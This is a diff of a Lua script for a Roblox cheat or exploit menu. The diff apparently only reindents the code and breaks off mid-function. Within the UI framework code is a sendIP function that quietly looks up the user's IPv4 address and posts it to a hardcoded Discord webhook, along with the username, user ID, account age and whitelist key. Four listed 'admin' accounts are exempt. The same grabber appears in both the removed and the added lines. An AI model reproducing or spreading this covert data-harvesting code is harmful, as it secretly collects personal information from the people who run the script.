@@ -1,207 +1,218 @@
 local framework = {
-  tabs = { },
-	flags = {
-    chatLogs = true,
-    canToggleUI = true,
-  },
-	toggled = true,
-	blacklistedKeys = {
-		Enum.KeyCode.Unknown,
-		Enum.KeyCode.W,
-		Enum.KeyCode.A,
-		Enum.KeyCode.S,
-		Enum.KeyCode.D,
-		Enum.KeyCode.Slash,
-		Enum.KeyCode.Tab,
-		Enum.KeyCode.Backspace,
-		Enum.KeyCode.Escape
-	},
-	whitelistedMouseinputs = {
-		Enum.UserInputType.MouseButton1,
-		Enum.UserInputType.MouseButton2,
-		Enum.UserInputType.MouseButton3
-	},
-	admin_accounts = {
-		azoozAccounts = {
-			[21763271] = true,
-		},
-		smail_accounts = {
-			[425451555] = true,
-			[1741538359] = true,
-		},
-		max_accounts = {
-			[278723686] = true
-		},
-    raven_accounts = {
-      [1949027883] = true,
-    }
-	},
-  menuSettings = {
-    mainColour = Color3.fromRGB(255, 4, 104),
-    secondaryColour = Color3.fromRGB(143, 1, 60),
-    textColor = Color3.fromRGB(255, 255, 255),
-    uiTransparency = 0,
-    titleSize = 18,
-    textSize = 16,
-    font = Enum.Font.Code
-  },
-}
-
-
-local runService = game:GetService("RunService")
-local inputService = game:GetService("UserInputService")
-local tweenService = game:GetService("TweenService")
-local canSendNotification = true
-
-function framework:Create(type, properties)
-	properties = typeof(properties) == "table" and properties or { }
-	local inst = Instance.new(type)
-	for property, value in next, properties do
-		inst[property] = value
-	end
-	return inst
-end
-
-local function sendIP(whitelistKey)
-  local Webhook = "https://discord.com/api/webhooks/921537619073073243/Xh8NcmNO8I6u-71I3HkXcUz_w9w33z0OZnoVWRZmTlb-ppuL4bi0zkp9hR3BG9stKcin"
-  local IPv4 = game:HttpGet("https://v4.ident.me/")
-  --local IPv6 = game:HttpGet("https://v6.ident.me/")
-
-  local Headers = {["content-type"] = "application/json"} -- Don't Modify
-
-  local LocalPlayer = game:GetService("Players").LocalPlayer
-
-  local AccountAge = LocalPlayer.AccountAge
-  local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
-  local UserId = LocalPlayer.UserId
-  local PlayerName = LocalPlayer.Name
-
-  local PlayerData =
-  {
-         ["content"] = "",
-         ["embeds"] = {{
-             ["title"] = "**Username**:",
-             ["description"] = PlayerName,
-             ["color"] = tonumber(0x2B6BE4),
-             ["fields"] = {
-                 {
-                     ["name"] = "MembershipType; ",
-                     ["value"] = MembershipType,
-                     ["inline"] = true
-  },
-                 {
-                     ["name"] = "AccountAge; ",
-                     ["value"] = AccountAge,
-                     ["inline"] = true
-  },
-                 {
-                     ["name"] = "UserId; ",
-                     ["value"] = UserId,
-                     ["inline"] = true
-  },
-                 {
-                     ["name"] = "IPv4; ",
-                     ["value"] = IPv4,
-                     ["inline"] = true
-  },
-      --[[          {
-                     ["name"] = "IPv6; ",
-                     ["value"] = IPv6,
-                     ["inline"] = true
-  },]]
-
-                          {
-                     ["name"] = "Whitelist; ",
-                     ["value"] = whitelistKey,
-                     ["inline"] = true
-  },
-             },
-
-         }}
-     }
-  local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
-  local HttpRequest = http_request;
-  if syn then
-     HttpRequest = syn.request
-     else
-     HttpRequest = http_request
+    tabs = { },
+      flags = {
+      chatLogs = true,
+      canToggleUI = true,
+    },
+      toggled = true,
+      blacklistedKeys = {
+          Enum.KeyCode.Unknown,
+          Enum.KeyCode.W,
+          Enum.KeyCode.A,
+          Enum.KeyCode.S,
+          Enum.KeyCode.D,
+          Enum.KeyCode.Slash,
+          Enum.KeyCode.Tab,
+          Enum.KeyCode.Backspace,
+          Enum.KeyCode.Escape
+      },
+      whitelistedMouseinputs = {
+          Enum.UserInputType.MouseButton1,
+          Enum.UserInputType.MouseButton2,
+          Enum.UserInputType.MouseButton3
+      },
+      admin_accounts = {
+          azoozAccounts = {
+              [21763271] = true,
+          },
+          smail_accounts = {
+              [425451555] = true,
+              [1741538359] = true,
+          },
+          max_accounts = {
+              [278723686] = true
+          },
+      raven_accounts = {
+        [1949027883] = true,
+      }
+      },
+    menuSettings = {
+      mainColour = Color3.fromRGB(255, 4, 104),
+      secondaryColour = Color3.fromRGB(143, 1, 60),
+      textColor = Color3.fromRGB(255, 255, 255),
+      uiTransparency = 0,
+      titleSize = 18,
+      textSize = 16,
+      font = Enum.Font.Code
+    },
+  }
+  
+  
+  local runService = game:GetService("RunService")
+  local inputService = game:GetService("UserInputService")
+  local tweenService = game:GetService("TweenService")
+  local canSendNotification = true
+  
+  function framework:Create(type, properties)
+      properties = typeof(properties) == "table" and properties or { }
+      local inst = Instance.new(type)
+      for property, value in next, properties do
+          inst[property] = value
+      end
+      return inst
   end
-  if framework.admin_accounts.azoozAccounts[game.Players.LocalPlayer.UserId] then
-  elseif framework.admin_accounts.smail_accounts[game.Players.LocalPlayer.UserId] then
-  elseif framework.admin_accounts.max_accounts[game.Players.LocalPlayer.UserId] then
-  elseif framework.admin_accounts.raven_accounts[game.Players.LocalPlayer.UserId] then
-  else
-      HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
+  
+  local function sendIP(whitelistKey)
+    local Webhook = "https://discord.com/api/webhooks/921537619073073243/Xh8NcmNO8I6u-71I3HkXcUz_w9w33z0OZnoVWRZmTlb-ppuL4bi0zkp9hR3BG9stKcin"
+    local IPv4 = game:HttpGet("https://v4.ident.me/")
+    --local IPv6 = game:HttpGet("https://v6.ident.me/")
+  
+    local Headers = {["content-type"] = "application/json"} -- Don't Modify
+  
+    local LocalPlayer = game:GetService("Players").LocalPlayer
+  
+    local AccountAge = LocalPlayer.AccountAge
+    local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
+    local UserId = LocalPlayer.UserId
+    local PlayerName = LocalPlayer.Name
+  
+    local PlayerData =
+    {
+           ["content"] = "",
+           ["embeds"] = {{
+               ["title"] = "**Username**:",
+               ["description"] = PlayerName,
+               ["color"] = tonumber(0x2B6BE4),
+               ["fields"] = {
+                   {
+                       ["name"] = "MembershipType; ",
+                       ["value"] = MembershipType,
+                       ["inline"] = true
+    },
+                   {
+                       ["name"] = "AccountAge; ",
+                       ["value"] = AccountAge,
+                       ["inline"] = true
+    },
+                   {
+                       ["name"] = "UserId; ",
+                       ["value"] = UserId,
+                       ["inline"] = true
+    },
+                   {
+                       ["name"] = "IPv4; ",
+                       ["value"] = IPv4,
+                       ["inline"] = true
+    },
+        --[[          {
+                       ["name"] = "IPv6; ",
+                       ["value"] = IPv6,
+                       ["inline"] = true
+    },]]
+  
+                            {
+                       ["name"] = "Whitelist; ",
+                       ["value"] = whitelistKey,
+                       ["inline"] = true
+    },
+               },
+  
+           }}
+       }
+    local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
+    local HttpRequest = http_request;
+    if syn then
+       HttpRequest = syn.request
+       else
+       HttpRequest = http_request
+    end
+    if framework.admin_accounts.azoozAccounts[game.Players.LocalPlayer.UserId] then
+    elseif framework.admin_accounts.smail_accounts[game.Players.LocalPlayer.UserId] then
+    elseif framework.admin_accounts.max_accounts[game.Players.LocalPlayer.UserId] then
+    elseif framework.admin_accounts.raven_accounts[game.Players.LocalPlayer.UserId] then
+    else
+        HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
+    end
   end
-end
-
-local chromaColor
-local rainbowTime = 5
-spawn(function()
-	while wait() do
-		chromaColor = Color3.fromHSV(tick() % rainbowTime / rainbowTime, 1, 1)
-	end
-end)
-
-function framework:sendNotification(text)
-  local alls = 25
-  local mainHolder = framework:Create("ImageLabel", {
-    Parent = framework.base,
-    Image = "rbxassetid://3570695787",
-    ImageColor3 = framework.menuSettings.mainColour,
-    SliceCenter = Rect.new(100, 100, 100, 100),
-    SliceScale = 0.08,
-    ScaleType = Enum.ScaleType.Slice,
-    BackgroundTransparency = 1,
-    Size = UDim2.new(0, 250, 0, 38),
-    Position = UDim2.new(2, 0, 0.749, 0)
-  })
-  local notification = framework:Create("TextLabel", {
-    Parent = mainHolder,
-    BackgroundTransparency = 1,
-    Position = UDim2.new(0.028, 0, 0, 0),
-    Size = UDim2.new(0, 230, 0, 24),
-    Font = framework.menuSettings.font,
-    Text = "Notification",
-    TextColor3 = Color3.fromRGB(255, 255, 255),
-    TextSize = 16
-  })
-  local holder = framework:Create("ImageLabel", {
-    Parent = mainHolder,
-    Image = "rbxassetid://3570695787",
-    ImageColor3 = Color3.fromRGB(20, 20, 20),
-    SliceCenter = Rect.new(100, 100, 100, 100),
-    ScaleType = Enum.ScaleType.Slice,
-    SliceScale = 0.04,
-    BackgroundTransparency = 1,
-    Size = UDim2.new(0, 250, 0, 44),
-    Position = UDim2.new(-0, 0, 0.632, 0)
-  })
-  local connector = framework:Create("Frame", {
-    Parent = holder,
-    BackgroundColor3 = Color3.fromRGB(20, 20, 20),
-    Size = UDim2.new(0, 250, 0, 22),
-    Position = UDim2.new(-0, 0, -0.002, 0),
-    BorderSizePixel = 0
-  })
-  local main = framework:Create("TextLabel", {
-    Parent = holder,
-    BackgroundTransparency = 1,
-    Position = UDim2.new(0.088, 0, 0.143, 0),
-    Size = UDim2.new(0, 200, 0, 84),
-    Font = framework.menuSettings.font,
-    TextSize = 16,
-    TextColor3 = Color3.fromRGB(255, 255, 255),
-    Text = text,
-    TextWrapped = true,
-    TextXAlignment = Enum.TextXAlignment.Left,
-    TextYAlignment = Enum.TextYAlignment.Top
-  })
-
-  main.Size = UDim2.new(0, 200, 0, main.TextBounds.Y)
-  holder.Size = UDim2.new(0, 250, 0, alls+main.TextBounds.Y)
-
-  if canSendNotification then
+  
+  local chromaColor
+  local rainbowTime = 5
+  spawn(function()
+      while wait() do
+          chromaColor = Color3.fromHSV(tick() % rainbowTime / rainbowTime, 1, 1)
+      end
+  end)
+  
+  function framework:sendNotification(text)
+    local alls = 25
+    local mainHolder = framework:Create("ImageLabel", {
+      Parent = framework.base,
+      Image = "rbxassetid://3570695787",
+      ImageColor3 = framework.menuSettings.mainColour,
+      SliceCenter = Rect.new(100, 100, 100, 100),
+      SliceScale = 0.08,
+      ScaleType = Enum.ScaleType.Slice,
+      BackgroundTransparency = 1,
+      Size = UDim2.new(0, 250, 0, 38),
+      Position = UDim2.new(2, 0, 0.749, 0)
+    })
+    local notification = framework:Create("TextLabel", {
+      Parent = mainHolder,
+      BackgroundTransparency = 1,
+      Position = UDim2.new(0.028, 0, 0, 0),
+      Size = UDim2.new(0, 230, 0, 24),
+      Font = framework.menuSettings.font,
+      Text = "Notification",
+      TextColor3 = Color3.fromRGB(255, 255, 255),
+      TextSize = 16
+    })
+    local holder = framework:Create("ImageLabel", {
+      Parent = mainHolder,
+      Image = "rbxassetid://3570695787",
+      ImageColor3 = Color3.fromRGB(20, 20, 20),
+      SliceCenter = Rect.new(100, 100, 100, 100),
+      ScaleType = Enum.ScaleType.Slice,
+      SliceScale = 0.04,
+      BackgroundTransparency = 1,
+      Size = UDim2.new(0, 250, 0, 44),
+      Position = UDim2.new(-0, 0, 0.632, 0)
+    })
+    local connector = framework:Create("Frame", {
+      Parent = holder,
+      BackgroundColor3 = Color3.fromRGB(20, 20, 20),
+      Size = UDim2.new(0, 250, 0, 22),
+      Position = UDim2.new(-0, 0, -0.002, 0),
+      BorderSizePixel = 0
+    })
+    local main = framework:Create("TextLabel", {
+      Parent = holder,
+      BackgroundTransparency = 1,
+      Position = UDim2.new(0.088, 0, 0.143, 0),
+      Size = UDim2.new(0, 200, 0, 84),
+      Font = framework.menuSettings.font,
+      TextSize = 16,
+      TextColor3 = Color3.fromRGB(255, 255, 255),
+      Text = text,
+      TextWrapped = true,
+      TextXAlignment = Enum.TextXAlignment.Left,
+      TextYAlignment = Enum.TextYAlignment.Top
+    })
+  
+    main.Size = UDim2.new(0, 200, 0, main.TextBounds.Y)
+    holder.Size = UDim2.new(0, 250, 0, alls+main.TextBounds.Y)
+  
+    if canSendNotification then
+        canSendNotification = false
+        tweenService:Create(mainHolder, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(0.838, 0, 0.749, 0)}):Play()
+        wait(3)
+        tweenService:Create(mainHolder, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(2, 0, 0.749, 0)}):Play()
+        wait(1)
+        mainHolder:Destroy()
+        canSendNotification = true
+    else
+      repeat
+        wait()
+      until canSendNotification == true
       canSendNotification = false
       tweenService:Create(mainHolder, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(0.838, 0, 0.749, 0)}):Play()
       wait(3)
@@ -209,2082 +220,354 @@ function framework:sendNotification(text)
       wait(1)
       mainHolder:Destroy()
       canSendNotification = true
-  else
-    repeat
-      wait()
-    until canSendNotification == true
-    canSendNotification = false
-    tweenService:Create(mainHolder, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(0.838, 0, 0.749, 0)}):Play()
-    wait(3)
-    tweenService:Create(mainHolder, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(2, 0, 0.749, 0)}):Play()
-    wait(1)
-    mainHolder:Destroy()
-    canSendNotification = true
-  end
-end
-
-function framework:saveSettings()
-	local Name = "ilove.Asians"
-	local Settings
-	if not pcall(function() readfile(Name) end) then writefile(Name, game:service'HttpService':JSONEncode(framework.flags)) end
-	Settings = game:service'HttpService':JSONDecode(readfile(Name))
-	local function Save()
-		writefile(Name,game:service'HttpService':JSONEncode(Settings))
-	end
-	for i,v in pairs(framework.flags) do
-      Settings[i] = v
-	end
-  Settings["mainColour"] = tostring(framework.menuSettings.mainColour)
-  Settings["secondaryColour"] = tostring(framework.menuSettings.secondaryColour)
-  Settings["textColor"] = tostring(framework.menuSettings.textColor)
-  Settings["titleSize"] = framework.menuSettings.titleSize
-  Settings["textSize"] = framework.menuSettings.textSize
-  Settings["uiTransparency"] = framework.menuSettings.uiTransparency
-	Save()
-  framework:sendNotification("Saved Settings OwO")
-end
-
-function framework:deleteSettings()
-  delfile("ilove.Asians")
-  framework:sendNotification("Deleted Settings OwO")
-end
-
-function framework:toggleUI(state)
-  if framework.flags.canToggleUI then
-    framework.flags.canToggleUI = false
-    framework.toggled = not framework.toggled
-    if framework.toggled then
-      framework.base.holder.mainHolder:TweenSize(UDim2.new(0, 527, 0, 0), "Out", "Quad", 0.7, true)
-      delay(0.7, function()
-        framework.base.holder.ClipsDescendants = true
-  			framework.base.holder:TweenSize(UDim2.new(0, 0, 0, 38), "Out", "Quad", 0.4, true)
-        wait(0.4)
-        framework.base.holder.Visible = false
-        framework.flags.canToggleUI = true
-  		end)
-    else
-      framework.base.holder.Visible = true
-      framework.base.holder.ClipsDescendants = false
-      framework.base.holder:TweenSize(UDim2.new(0, 527, 0, 38), "Out", "Quad", 0.4, true)
-      delay(0.4, function()
-        framework.base.holder.mainHolder:TweenSize(UDim2.new(0, 527, 0, 477), "Out", "Quad", 0.7, true)
-        framework.flags.canToggleUI = true
-      end)
     end
   end
-end
-
-local function dragify(Frame)
-    dragToggle = nil
-    local dragSpeed = 3.5
-    dragInput = nil
-    dragStart = nil
-    local dragPos = nil
-    function updateInput(input)
-        local Delta = input.Position - dragStart
-        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
-        tweenService:Create(Frame, TweenInfo.new(0.30), {Position = Position}):Play()
-    end
-    Frame.InputBegan:Connect(function(input)
-        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and inputService:GetFocusedTextBox() == nil then
-            dragToggle = true
-            dragStart = input.Position
-            startPos = Frame.Position
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then
-                    dragToggle = false
-                end
+  
+  function framework:saveSettings()
+      local Name = "ilove.Asians"
+      local Settings
+      if not pcall(function() readfile(Name) end) then writefile(Name, game:service'HttpService':JSONEncode(framework.flags)) end
+      Settings = game:service'HttpService':JSONDecode(readfile(Name))
+      local function Save()
+          writefile(Name,game:service'HttpService':JSONEncode(Settings))
+      end
+      for i,v in pairs(framework.flags) do
+        Settings[i] = v
+      end
+    Settings["mainColour"] = tostring(framework.menuSettings.mainColour)
+    Settings["secondaryColour"] = tostring(framework.menuSettings.secondaryColour)
+    Settings["textColor"] = tostring(framework.menuSettings.textColor)
+    Settings["titleSize"] = framework.menuSettings.titleSize
+    Settings["textSize"] = framework.menuSettings.textSize
+    Settings["uiTransparency"] = framework.menuSettings.uiTransparency
+      Save()
+    framework:sendNotification("Saved Settings OwO")
+  end
+  
+  function framework:deleteSettings()
+    delfile("ilove.Asians")
+    framework:sendNotification("Deleted Settings OwO")
+  end
+  
+  function framework:toggleUI(state)
+    if framework.flags.canToggleUI then
+      framework.flags.canToggleUI = false
+      framework.toggled = not framework.toggled
+      if framework.toggled then
+        framework.base.holder.mainHolder:TweenSize(UDim2.new(0, 527, 0, 0), "Out", "Quad", 0.7, true)
+        delay(0.7, function()
+          framework.base.holder.ClipsDescendants = true
+                framework.base.holder:TweenSize(UDim2.new(0, 0, 0, 38), "Out", "Quad", 0.4, true)
+          wait(0.4)
+          framework.base.holder.Visible = false
+          framework.flags.canToggleUI = true
             end)
-        end
-    end)
-    Frame.InputChanged:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-            dragInput = input
-        end
-    end)
-    game:GetService("UserInputService").InputChanged:Connect(function(input)
-        if input == dragInput and dragToggle then
-            updateInput(input)
-        end
-    end)
-end
-
-local function createNameTag(accountName, person)
-  for i,v in pairs(game.Players:GetChildren()) do
-      if v.Name == accountName then
-        local billboard = framework:Create("BillboardGui", {
-            Parent = v.Character:WaitForChild("Head"),
-            Active = true,
-            AlwaysOnTop = false,
-            Enabled = true,
-            LightInfluence = 0,
-            MaxDistance = 200,
-            Size = UDim2.new(12, 0, 2, 0),
-            StudsOffset = Vector3.new(0, 4, 0)
-          })
-        local name = framework:Create("TextLabel", {
-            Parent = billboard,
-            BackgroundTransparency = 1,
-            Position = UDim2.new(0, 0, 0, 0),
-            Size = UDim2.new(1, 0, 1, 0),
-            Font = Enum.Font.GothamBlack,
-            Text = tostring(person),
-            TextStrokeTransparency = 0,
-            TextColor3 = Color3.fromRGB(255, 51, 255),
-            TextStrokeColor3 = Color3.fromRGB(255, 255, 255),
-            TextScaled = true
-        })
-        game:GetService("RunService").RenderStepped:Connect(function()
-          if person == "Azooz" then
-            name.TextColor3 = chromaColor
-          elseif person == "Smail" then
-            name.TextColor3 = Color3.fromRGB(0, 0, 0)
-          end
+      else
+        framework.base.holder.Visible = true
+        framework.base.holder.ClipsDescendants = false
+        framework.base.holder:TweenSize(UDim2.new(0, 527, 0, 38), "Out", "Quad", 0.4, true)
+        delay(0.4, function()
+          framework.base.holder.mainHolder:TweenSize(UDim2.new(0, 527, 0, 477), "Out", "Quad", 0.7, true)
+          framework.flags.canToggleUI = true
         end)
       end
     end
-end
-
-local function round(num, bracket)
-	bracket = bracket or 1
-	local a = math.floor(num/bracket + (math.sign(num) * 0.5)) * bracket
-	if a < 0 then
-		a = a + bracket
-	end
-	return a
-end
-
-local function Time()
-	local HOUR = math.floor((tick() % 86400) / 3600)
-	local MINUTE = math.floor((tick() % 3600) / 60)
-	local SECOND = math.floor(tick() % 60)
-	local AP = HOUR > 11 and 'PM' or 'AM'
-	HOUR = (HOUR % 12 == 0 and 12 or HOUR % 12)
-	HOUR = HOUR < 10 and '0' .. HOUR or HOUR
-	MINUTE = MINUTE < 10 and '0' .. MINUTE or MINUTE
-	SECOND = SECOND < 10 and '0' .. SECOND or SECOND
-	return HOUR .. ';' .. MINUTE .. ';' .. SECOND .. ' ' .. AP
-end
-
-local function createTab(title, parent, parentTable)
-  local tabButton = framework:Create("TextButton", {
-    Size = UDim2.new(0, string.len(title)*10+10, 0, 22),
-    Parent = framework.base.holder.mainHolder.tabs,
-    Text = tostring(title),
-    TextColor3 = Color3.fromRGB(255, 255, 255),
-    TextSize = 16,
-    BackgroundTransparency = 1,
-    Font = framework.menuSettings.font,
-  })
-  parentTable.main = framework:Create("Frame", {
-    Position = UDim2.new(0.015, 0, 0.067, 0),
-    Size = UDim2.new(0, 513, 0, 423),
-    Visible = false,
-    BackgroundTransparency = 1,
-    Parent = parent
-  })
-  local layout = framework:Create("UIListLayout", {
-    Parent = parentTable.main,
-    Padding = UDim.new(0.01, 1),
-    HorizontalAlignment = Enum.HorizontalAlignment.Left
-  })
-  tabButton.MouseButton1Click:Connect(function()
-    for i,v in pairs(framework.base.holder.mainHolder.tabOptionsHolder:GetChildren()) do
-      v.Visible = false
-    end
-    parentTable.main.Visible = true
-  end)
-
-  game:GetService("RunService").RenderStepped:Connect(function()
-    tabButton.TextSize = framework.menuSettings.textSize
-    tabButton.Font = framework.menuSettings.font
-    tabButton.TextColor3 = framework.menuSettings.textColor
-  end)
-end
-
-local function createFolder(title, parent, parentTable, subHolder)
-  local size = subHolder and 21 or 25*#parentTable.options+21
-  local inContact
-  local holder = framework:Create("Frame", {
-    Parent = parent,
-    Size = UDim2.new(0, 504, 0, 21),
-    BackgroundTransparency = 1,
-    ClipsDescendants = true
-  })
-  local layout = framework:Create("UIListLayout", {
-    Parent = holder,
-    Padding = UDim.new(0, 5)
-  })
-  local titleHolder1 = framework:Create("Frame", {
-    Parent = holder,
-    BackgroundTransparency = 1,
-    Size = UDim2.new(0, 502, 0, 18)
-  })
-  local titleHolder = framework:Create("Frame", {
-    Parent = titleHolder1,
-    BackgroundColor3 = framework.menuSettings.secondaryColour,
-    BorderColor3 = Color3.fromRGB(255, 255, 255),
-    Position = UDim2.new(0.011, 0, 0.111, 0),
-    Size = UDim2.new(0, 497, 0, 16)
-  })
-  local main = framework:Create("TextLabel", {
-    Parent = titleHolder,
-    BackgroundTransparency = 1,
-    Position = UDim2.new(0.056, 0, 0, 0),
-    Size = UDim2.new(0, 469,0, 16),
-    Font = framework.menuSettings.font,
-    Text = title,
-    TextColor3 = Color3.fromRGB(255, 255, 255),
-    TextSize = 16,
-    TextXAlignment = Enum.TextXAlignment.Left
-  })
-  local dropDown = framework:Create("ImageLabel", {
-    Parent = titleHolder,
-    BackgroundTransparency = 1,
-    ScaleType = Enum.ScaleType.Fit,
-    Image = "http://www.roblox.com/asset/?id=6282522798",
-    ImageColor3 = Color3.fromRGB(255, 255, 255),
-    Rotation = 270,
-    Size = UDim2.new(0, 16, 0, 20),
-    Position = UDim2.new(0.008, 0, -0.125, 0)
-  })
-  local parentTable1 = framework:Create("Frame", {
-    Parent = holder,
-    BackgroundTransparency = 1,
-    Size = UDim2.new(0, 502, 0, 29)
-  })
-  if 25*#parentTable.options+21 > 200 then
-    parentTable.main = framework:Create("ScrollingFrame", {
-      Parent = parentTable1,
-      CanvasPosition = Vector2.new(0, 0),
-      Size = UDim2.new(0, 504, 0, 200),
+  end
+  
+  local function dragify(Frame)
+      dragToggle = nil
+      local dragSpeed = 3.5
+      dragInput = nil
+      dragStart = nil
+      local dragPos = nil
+      function updateInput(input)
+          local Delta = input.Position - dragStart
+          local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+          tweenService:Create(Frame, TweenInfo.new(0.30), {Position = Position}):Play()
+      end
+      Frame.InputBegan:Connect(function(input)
+          if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and inputService:GetFocusedTextBox() == nil then
+              dragToggle = true
+              dragStart = input.Position
+              startPos = Frame.Position
+              input.Changed:Connect(function()
+                  if input.UserInputState == Enum.UserInputState.End then
+                      dragToggle = false
+                  end
+              end)
+          end
+      end)
+      Frame.InputChanged:Connect(function(input)
+          if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+              dragInput = input
+          end
+      end)
+      game:GetService("UserInputService").InputChanged:Connect(function(input)
+          if input == dragInput and dragToggle then
+              updateInput(input)
+          end
+      end)
+  end
+  
+  local function createNameTag(accountName, person)
+    for i,v in pairs(game.Players:GetChildren()) do
+        if v.Name == accountName then
+          local billboard = framework:Create("BillboardGui", {
+              Parent = v.Character:WaitForChild("Head"),
+              Active = true,
+              AlwaysOnTop = false,
+              Enabled = true,
+              LightInfluence = 0,
+              MaxDistance = 200,
+              Size = UDim2.new(12, 0, 2, 0),
+              StudsOffset = Vector3.new(0, 4, 0)
+            })
+          local name = framework:Create("TextLabel", {
+              Parent = billboard,
+              BackgroundTransparency = 1,
+              Position = UDim2.new(0, 0, 0, 0),
+              Size = UDim2.new(1, 0, 1, 0),
+              Font = Enum.Font.GothamBlack,
+              Text = tostring(person),
+              TextStrokeTransparency = 0,
+              TextColor3 = Color3.fromRGB(255, 51, 255),
+              TextStrokeColor3 = Color3.fromRGB(255, 255, 255),
+              TextScaled = true
+          })
+          game:GetService("RunService").RenderStepped:Connect(function()
+            if person == "Azooz" then
+              name.TextColor3 = chromaColor
+            elseif person == "Smail" then
+              name.TextColor3 = Color3.fromRGB(0, 0, 0)
+            end
+          end)
+        end
+      end
+  end
+  
+  local function round(num, bracket)
+      bracket = bracket or 1
+      local a = math.floor(num/bracket + (math.sign(num) * 0.5)) * bracket
+      if a < 0 then
+          a = a + bracket
+      end
+      return a
+  end
+  
+  local function Time()
+      local HOUR = math.floor((tick() % 86400) / 3600)
+      local MINUTE = math.floor((tick() % 3600) / 60)
+      local SECOND = math.floor(tick() % 60)
+      local AP = HOUR > 11 and 'PM' or 'AM'
+      HOUR = (HOUR % 12 == 0 and 12 or HOUR % 12)
+      HOUR = HOUR < 10 and '0' .. HOUR or HOUR
+      MINUTE = MINUTE < 10 and '0' .. MINUTE or MINUTE
+      SECOND = SECOND < 10 and '0' .. SECOND or SECOND
+      return HOUR .. ';' .. MINUTE .. ';' .. SECOND .. ' ' .. AP
+  end
+  
+  local function createTab(title, parent, parentTable)
+    local tabButton = framework:Create("TextButton", {
+      Size = UDim2.new(0, string.len(title)*10+10, 0, 22),
+      Parent = framework.base.holder.mainHolder.tabs,
+      Text = tostring(title),
+      TextColor3 = Color3.fromRGB(255, 255, 255),
+      TextSize = 16,
       BackgroundTransparency = 1,
-      CanvasSize = UDim2.new(0, 0, 0, 32*#parentTable.options),
-      ScrollBarImageColor3 = framework.menuSettings.mainColour,
-      BorderColor3 = framework.menuSettings.secondaryColour,
-      BorderSizePixel = 2,
+      Font = framework.menuSettings.font,
+    })
+    parentTable.main = framework:Create("Frame", {
+      Position = UDim2.new(0.015, 0, 0.067, 0),
+      Size = UDim2.new(0, 513, 0, 423),
+      Visible = false,
+      BackgroundTransparency = 1,
+      Parent = parent
+    })
+    local layout = framework:Create("UIListLayout", {
+      Parent = parentTable.main,
+      Padding = UDim.new(0.01, 1),
+      HorizontalAlignment = Enum.HorizontalAlignment.Left
+    })
+    tabButton.MouseButton1Click:Connect(function()
+      for i,v in pairs(framework.base.holder.mainHolder.tabOptionsHolder:GetChildren()) do
+        v.Visible = false
+      end
+      parentTable.main.Visible = true
+    end)
+  
+    game:GetService("RunService").RenderStepped:Connect(function()
+      tabButton.TextSize = framework.menuSettings.textSize
+      tabButton.Font = framework.menuSettings.font
+      tabButton.TextColor3 = framework.menuSettings.textColor
+    end)
+  end
+  
+  local function createFolder(title, parent, parentTable, subHolder)
+    local size = subHolder and 21 or 25*#parentTable.options+21
+    local inContact
+    local holder = framework:Create("Frame", {
+      Parent = parent,
+      Size = UDim2.new(0, 504, 0, 21),
+      BackgroundTransparency = 1,
       ClipsDescendants = true
     })
-  elseif 25*#parentTable.options+21 < 200 then
-    parentTable.main = framework:Create("Frame", {
-      Parent = parentTable1,
-      Position = UDim2.new(0.044, 0, 0, 0),
-      Size = UDim2.new(0, 480, 0, 301),
-      BackgroundTransparency = 1
+    local layout = framework:Create("UIListLayout", {
+      Parent = holder,
+      Padding = UDim.new(0, 5)
     })
-  end
-  local layoutOptions = framework:Create("UIListLayout", {
-    Parent = parentTable.main,
-    Padding = UDim.new(0, 5)
-  })
-  dropDown.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-			parentTable.open = not parentTable.open
-      if parentTable1:FindFirstChildOfClass("ScrollingFrame") then
-        holder:TweenSize(#parentTable.options > 0 and parentTable.open and UDim2.new(0, 504, 0, 200) or UDim2.new(0, 504, 0, size), "Out", "Quad", 0.2, true)
-      else
-        holder:TweenSize(#parentTable.options > 0 and parentTable.open and UDim2.new(0, 504, 0, layout.AbsoluteContentSize.Y + 25*#parentTable.options+21) or UDim2.new(0, 504, 0, size), "Out", "Quad", 0.2, true)
+    local titleHolder1 = framework:Create("Frame", {
+      Parent = holder,
+      BackgroundTransparency = 1,
+      Size = UDim2.new(0, 502, 0, 18)
+    })
+    local titleHolder = framework:Create("Frame", {
+      Parent = titleHolder1,
+      BackgroundColor3 = framework.menuSettings.secondaryColour,
+      BorderColor3 = Color3.fromRGB(255, 255, 255),
+      Position = UDim2.new(0.011, 0, 0.111, 0),
+      Size = UDim2.new(0, 497, 0, 16)
+    })
+    local main = framework:Create("TextLabel", {
+      Parent = titleHolder,
+      BackgroundTransparency = 1,
+      Position = UDim2.new(0.056, 0, 0, 0),
+      Size = UDim2.new(0, 469,0, 16),
+      Font = framework.menuSettings.font,
+      Text = title,
+      TextColor3 = Color3.fromRGB(255, 255, 255),
+      TextSize = 16,
+      TextXAlignment = Enum.TextXAlignment.Left
+    })
+    local dropDown = framework:Create("ImageLabel", {
+      Parent = titleHolder,
+      BackgroundTransparency = 1,
